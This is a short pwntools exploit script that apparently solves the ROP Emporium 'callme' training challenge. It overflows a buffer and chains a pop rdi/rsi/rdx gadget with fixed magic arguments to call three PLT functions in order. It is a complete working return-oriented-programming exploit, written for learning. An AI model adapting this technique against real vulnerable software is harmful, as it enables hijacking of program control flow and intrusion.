from pwn import *

r = process("./callme")
exe = ELF("./callme")
callme_one = p64(exe.plt["callme_one"])
callme_two = p64(exe.plt["callme_two"])
callme_three = p64(exe.plt["callme_three"])

# Gadgets:
# 0x000000000040093c: pop rdi; pop rsi; pop rdx; ret;
# 0x00000000004006be: ret;

pop_rdi_rsi_rdx = p64(0x40093C)
ret = p64(0x4006BE)

rdi = p64(0xDEADBEEFDEADBEEF)
rsi = p64(0xCAFEBABECAFEBABE)
rdx = p64(0xD00DF00DD00DF00D)
general_gadget = pop_rdi_rsi_rdx + rdi + rsi + rdx

payload = (
    cyclic(0x28)
    + ret
    + general_gadget
    + callme_one
    + general_gadget
    + callme_two
    + general_gadget
    + callme_three
)

r.recvuntil(b"> ")
r.send(payload)
r.interactive()
